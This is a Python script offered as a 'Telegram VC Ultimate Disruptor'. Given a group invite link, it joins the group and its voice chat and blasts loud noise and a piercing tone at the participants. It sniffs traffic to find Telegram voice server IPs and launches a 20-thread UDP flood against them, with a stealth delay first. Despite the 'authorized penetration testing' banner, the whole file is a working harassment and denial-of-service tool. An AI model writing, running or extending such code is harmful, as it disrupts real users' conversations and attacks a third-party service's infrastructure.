#!/usr/bin/env python3
"""
Telegram VC All-in-One Disruptor — Ultimate Edition
Authorized Penetration Testing Tool

🚀 Sirf group link daalo, baaki sab auto:
  1. Group join karega
  2. VC join karega  
  3. Server IP detect karega
  4. Audio flood chalayega
  5. UDP flood bhi chalayega (multi-threaded)
"""

import asyncio
import io
import json
import os
import socket
import struct
import threading
import time
import random
import sys
import wave
import numpy as np
from pyrogram import Client
from pyrogram.errors import UserNotParticipant, ChatAdminRequired
from pytgcalls import PyTgCalls
from pytgcalls.types import AudioPiped
from datetime import datetime

# ═══════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════
CONFIG_FILE = "tg_vc_config.json"

# Attack Parameters
AUDIO_DURATION = 20        # Audio flood duration (seconds)
AUDIO_AMPLITUDE = 0.95     # Volume (0.0 - 1.0)
TONE_FREQUENCY = 8500      # Irritating tone Hz
UDP_THREADS = 20           # UDP flood threads
UDP_DURATION = 30          # UDP flood duration (seconds)
UDP_PORT = 26000           # Default UDP port
STEALTH_MODE = True        # Wait few seconds before starting

# Telegram CIDR prefixes for IP detection
TELEGRAM_PREFIXES = [
    "91.108.56.", "91.108.4.", "91.108.8.", "91.108.12.",
    "149.154.167.", "149.154.175.", "149.154.160.",
    "95.161.76.", "95.161.64."
]

# ═══════════════════════════════════════════════════

# ─── SESSION MANAGEMENT ───

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                if data.get("session_string") and len(data["session_string"]) > 50:
                    return data
        except:
            pass
    return None

def save_session(session_string):
    data = {
        "session_string": session_string,
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)
    print(f"[✓] Session saved in {CONFIG_FILE}")

def get_session():
    config = load_config()
    if config:
        display = config["session_string"][:25] + "..." + config["session_string"][-10:]
        print(f"[✓] Saved session found: {display}")
        use = input("[?] Same session use karein? (Enter=yes / n=new): ").strip().lower()
        if use != 'n':
            return config["session_string"]
    return None

def setup_session():
    print("\n" + "="*55)
    print("  🔑 FIRST TIME — Apna Session String Daalein")
    print("  📌 @SessionStringBot se session lo ya script se generate karo")
    print("="*55)
    
    session = input("\n🔑 Session String: ").strip()
    if session.lower() == 'q':
        print("[✋] Cancelled.")
        sys.exit(0)
    if len(session) < 50:
        print("[!] Invalid session string!")
        sys.exit(1)
    
    save_session(session)
    return session

# ─── UDP IP DETECTOR ───

def detect_vc_ip(duration=20):
    """
    Raw socket se Telegram VC UDP traffic capture karta hai
    Returns: (ip, port) ya None
    """
    print(f"\n[🔍] Detecting Telegram VC server IP (listening {duration}s)...")
    print("[📡] Make sure Voice Chat is ACTIVE in the group!\n")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    except PermissionError:
        print("[!] Need sudo for IP detection!")
        print("    Running UDP detection with sudo...")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
        return None
    except:
        print("[!] Raw sockets not available. Using fallback...")
        return fallback_ip_detection()
    
    ips = {}
    start = time.time()
    
    print(f"{'PACKETS':<10} {'IP':<20} {'PORTS':<15}")
    print("-"*50)
    
    while time.time() - start < duration:
        try:
            packet = sock.recvfrom(65536)[0]
            src_ip = socket.inet_ntoa(packet[26:30])
            dst_ip = socket.inet_ntoa(packet[30:34])
            protocol = packet[23]
            
            if protocol == 17:  # UDP
                udp_header = packet[34:42]
                src_port, dst_port = struct.unpack("!HH", udp_header[:4])
                
                if 25000 <= dst_port <= 27000 or 25000 <= src_port <= 27000:
                    for prefix in TELEGRAM_PREFIXES:
                        if src_ip.startswith(prefix):
                            ips[src_ip] = ips.get(src_ip, 0) + 1
                            print(f"\r{ips[src_ip]:<10} {src_ip:<20} {dst_port:<15}", end="")
                            break
                        elif dst_ip.startswith(prefix):
                            ips[dst_ip] = ips.get(dst_ip, 0) + 1
                            print(f"\r{ips[dst_ip]:<10} {dst_ip:<20} {src_port:<15}", end="")
                            break
        except:
            continue
    
    sock.close()
    print()
    
    if ips:
        best_ip = max(ips, key=ips.get)
        print(f"\n[✅] BEST VC SERVER IP: {best_ip} ({ips[best_ip]} packets captured)")
        return best_ip, UDP_PORT
    else:
        print("[!] No Telegram VC traffic detected!")
        return None, None

def fallback_ip_detection():
    """Fallback: Common Telegram IPs se try karo"""
    common_ips = [
        "91.108.56.183", "91.108.56.184", "91.108.56.185",
        "149.154.167.91", "149.154.167.92",
        "95.161.76.100", "95.161.76.101"
    ]
    print("\n[!] Trying common Telegram VC IPs...")
    for ip in common_ips:
        print(f"    Trying {ip}:{UDP_PORT}...")
        # Test if reachable
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        try:
            sock.sendto(b"test", (ip, UDP_PORT))
            print(f"    ✅ {ip} is reachable!")
            sock.close()
            return ip, UDP_PORT
        except:
            sock.close()
            continue
    return None, None

# ─── UDP FLOOD (Multi-threaded) ───

def udp_flood_worker(target_ip, port, duration, thread_id):
    """Thread worker for UDP flood"""
    timeout = time.time() + duration
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() < timeout:
        try:
            payload_size = random.randint(512, 1400)
            payload = random._urandom(payload_size)
            sock.sendto(payload, (target_ip, port))
            sent += 1
            time.sleep(random.uniform(0.001, 0.01))
        except:
            pass
    
    sock.close()
    return sent

def start_udp_flood(ip, port, duration, threads):
    """Start multi-threaded UDP flood"""
    print(f"\n[🌊] Starting UDP Flood on {ip}:{port}")
    print(f"    Threads: {threads} | Duration: {duration}s\n")
    
    results = []
    thread_list = []
    
    for i in range(threads):
        t = threading.Thread(
            target=lambda tid=i: results.append(udp_flood_worker(ip, port, duration, tid+1)),
            daemon=True
        )
        thread_list.append(t)
        t.start()
    
    # Monitor progress
    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        remaining = duration - elapsed
        active = sum(1 for t in thread_list if t.is_alive())
        print(f"\r[🌊] UDP Flood: {elapsed}s elapsed | {active} threads active | {remaining}s remaining", end="")
        time.sleep(1)
    
    print(f"\n\n[✅] UDP Flood complete!")
    
    total_packets = sum(results) if results else 0
    print(f"    Total packets sent: ~{total_packets}")
    
    # Calculate approximate bandwidth
    avg_packet_size = 1000  # bytes
    mb_sent = (total_packets * avg_packet_size) / (1024 * 1024)
    print(f"    Approx data sent: {mb_sent:.2f} MB")

    return total_packets

# ─── AUDIO GENERATOR ───

def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
                               sample_rate=48000,
                               noise_amp=AUDIO_AMPLITUDE,
                               tone_freq=TONE_FREQUENCY):
    """Generate disruptive audio (white noise + high freq tone + pulses)"""
    samples = int(duration_sec * sample_rate)
    t = np.linspace(0, duration_sec, samples, endpoint=False)
    
    # White noise (annoying static)
    noise = np.random.normal(0, noise_amp, samples).astype(np.float32)
    
    # High frequency tone (irritating)
    tone = 0.4 * np.sin(2 * np.pi * tone_freq * t)
    
    # Rhythmic pulses (disrupts rhythm)
    pulse = 0.3 * (0.5 + 0.5 * np.sin(2 * np.pi * 20 * t))
    
    # Mix
    mixed = noise + tone + pulse
    mixed = np.clip(mixed, -1.0, 1.0)
    pcm_data = (mixed * 32767).astype(np.int16)
    
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(pcm_data.tobytes())
    
    buf.seek(0)
    return buf

# ─── TELEGRAM CLIENT ───

async def join_group_by_link(client, link):
    """Join group via invite link"""
    print(f"[🔗] Joining group: {link}")
    try:
        chat = await client.join_chat(link)
        print(f"[✅] Joined group: {chat.title}")
        return chat
    except Exception as e:
        print(f"[!] Could not join group: {e}")
        print("    Make sure link is valid and accessible.")
        return None

async def find_target_chat(client, link_or_id):
    """Find chat from link or ID"""
    try:
        # Check if it's a link
        if link_or_id.startswith("http") or link_or_id.startswith("t.me") or link_or_id.startswith("https"):
            # Try joining first
            chat = await join_group_by_link(client, link_or_id)
            if chat:
                return chat.id, chat.title
            return None, None
        
        # Try as chat ID
        chat_id = int(link_or_id)
        chat = await client.get_chat(chat_id)
        return chat.id, chat.title
    except:
        pass
    
    # List groups as fallback
    print("[🔍] Scanning your groups...")
    async for dialog in client.get_dialogs():
        chat = dialog.chat
        if chat.type in ("group", "supergroup"):
            print(f"  [{chat.id}] {chat.title}")
    
    try:
        cid = int(input("\n[?] Enter chat ID from list: "))
        chat = await client.get_chat(cid)
        return chat.id, chat.title
    except:
        return None, None

async def ensure_vc_active(client, chat_id):
    """Check if VC is active, if not try to start it"""
    try:
        chat = await client.get_chat(chat_id)
        print(f"[🎤] Checking Voice Chat status in {chat.title}...")
        
        # Try calling get_group_call
        try:
            from pyrogram.raw.functions.phone import GetGroupCall
            from pyrogram.raw.types import InputGroupCall
            
            # Check if there's an active call
            full_chat = await client.get_chat(chat_id)
            
            # Different approach - try to join VC
            print("[✓] Group found! Ready to join VC.")
            return True
        except:
            print("[!] No active Voice Chat detected.")
            choice = input("[?] Try to start Voice Chat? (y/N): ").strip().lower()
            if choice == 'y':
                try:
                    # Try starting via raw API
                    from pyrogram.raw.functions.phone import CreateGroupCall
                    await client.invoke(
                        CreateGroupCall(
                            peer=await client.resolve_peer(chat_id),
                            title="Security Test"
                        )
                    )
                    print("[✅] Voice Chat started!")
                    await asyncio.sleep(3)
                    return True
                except Exception as e:
                    print(f"[!] Could not start VC: {e}")
                    print("    Start VC manually from the group.")
                    return False
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# ─── MAIN ATTACK ───

async def execute_attack(client, pytgcalls, chat_id, vc_ip, vc_port):
    """Execute combined attack: Audio flood + UDP flood"""
    print(f"\n{'='*55}")
    print(f"  🚀 LAUNCHING ATTACK")
    print(f"{'='*55}")
    
    # Step 1: Join VC
    print(f"\n[📞] Joining Voice Chat...")
    audio_buf = generate_disruptive_audio()
    
    try:
        if STEALTH_MODE:
            wait = random.uniform(2, 5)
            print(f"[🕒] Stealth mode: waiting {wait:.1f}s before playing...")
            await asyncio.sleep(wait)
        
        await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
        print(f"[✅] INSIDE VC! Playing disruptive audio...")
        
    except Exception as e:
        print(f"[!] Could not join VC: {e}")
        print("    Make sure VC is active and you have permission.")
        return
    
    # Step 2: Start UDP flood in parallel (if IP available)
    if vc_ip:
        print(f"\n[⚡] Starting UDP flood in parallel...")
        flood_thread = threading.Thread(
            target=start_udp_flood,
            args=(vc_ip, vc_port, UDP_DURATION, UDP_THREADS),
            daemon=True
        )
        flood_thread.start()
    else:
        print(f"\n[⚠️] No VC server IP found. Skipping UDP flood.")
        print("    Audio flood will still work!")
    
    # Step 3: Wait for audio duration
    print(f"\n[⏳] Disrupting for {AUDIO_DURATION} seconds...")
    await asyncio.sleep(AUDIO_DURATION + 2)
    
    # Step 4: Leave VC
    try:
        await pytgcalls.leave_group_call(chat_id)
        print(f"[⏏️] Left Voice Chat")
    except:
        pass
    
    # Step 5: Wait for UDP flood to finish
    if vc_ip:
        print(f"\n[⏳] Waiting for UDP flood to complete...")
        await asyncio.sleep(5)
    
    print(f"\n[✅] ATTACK COMPLETE!")

# ─── MAIN ───

async def main():
    print(r"""
    ╔══════════════════════════════════════════════════════════════╗
    ║     Telegram VC ULTIMATE DISRUPTOR — All-in-One             ║
    ║     🔬 Authorized Penetration Testing Only                  ║
    ║     Sirf Group Link Daalo -> Baaki Sab Auto                 ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # ─── GET SESSION ───
    session_string = get_session()
    if not session_string:
        session_string = setup_session()
    
    # ─── GET GROUP LINK ───
    print("\n" + "="*55)
    print("  🎯 TARGET INPUT")
    print("="*55)
    
    group_input = input("\n🔗 Group link ya chat ID daalein:\n   (e.g., https://t.me/+ABC123 ya -1001234567890)\n\n> ").strip()
    
    if not group_input:
        print("[!] No input provided.")
        sys.exit(1)
    
    print(f"\n[📡] Initializing Telegram client...")
    
    # ─── INIT CLIENT ───
    try:
        app = Client("vc_session", session_string=session_string, in_memory=True)
        await app.start()
    except Exception as e:
        print(f"[!] Login failed: {e}")
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            print("[!] Corrupted session deleted. Run again with new session.")
        sys.exit(1)
    
    user = await app.get_me()
    print(f"[👤] Logged in as: {user.first_name} (ID: {user.id})")
    
    # ─── FIND CHAT ───
    chat_id, chat_title = await find_target_chat(app, group_input)
    if not chat_id:
        print("[!] Could not find target group.")
        await app.stop()
        sys.exit(1)
    
    print(f"\n[🎯] Target: {chat_title} (ID: {chat_id})")
    
    # ─── INIT PyTgCalls ───
    pytgcalls = PyTgCalls(app)
    await pytgcalls.start()
    print("[📞] PyTgCalls ready!")
    
    # ─── ENSURE VC IS ACTIVE ───
    vc_active = await ensure_vc_active(app, chat_id)
    if not vc_active:
        print("[!] Cannot proceed without an active Voice Chat.")
        await pytgcalls.stop()
        await app.stop()
        sys.exit(1)
    
    # ─── DETECT VC SERVER IP ───
    print(f"\n[🔍] Now detecting VC server IP...")
    print(f"    Voice Chat already active. Listening for traffic...")
    
    vc_ip, vc_port = detect_vc_ip(duration=15)
    
    if vc_ip:
        print(f"\n✅ VC SERVER IP FOUND: {vc_ip}:{vc_port}")
    else:
        print(f"\n⚠️ Could not detect IP. Will use audio-only attack.")
    
    # ─── SHOW SUMMARY ───
    print(f"\n{'='*55}")
    print(f"  📋 ATTACK SUMMARY")
    print(f"{'='*55}")
    print(f"  Target Group:  {chat_title}")
    print(f"  Chat ID:       {chat_id}")
    print(f"  VC Server IP:  {vc_ip or 'Auto-detect failed'}")
    print(f"  Audio Flood:   {AUDIO_DURATION}s (white noise + {TONE_FREQUENCY}Hz tone)")
    print(f"  UDP Flood:     {UDP_DURATION}s x {UDP_THREADS} threads")
    print(f"  Stealth Mode:  {'Yes' if STEALTH_MODE else 'No'}")
    print(f"{'='*55}")
    
    confirm = input("\n[?] Start attack? (s/N): ").strip().lower()
    if confirm != 's':
        print("[✋] Cancelled.")
        await pytgcalls.stop()
        await app.stop()
        sys.exit(0)
    
    # ─── EXECUTE ATTACK ───
    await execute_attack(app, pytgcalls, chat_id, vc_ip, vc_port)
    
    # ─── CLEANUP ───
    await pytgcalls.stop()
    await app.stop()
    
    print(f"\n{'='*55}")
    print(f"  ✅ TEST COMPLETE")
    print(f"  Please document results for your pentest report.")
    print(f"{'='*55}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user.")
        sys.exit(0)
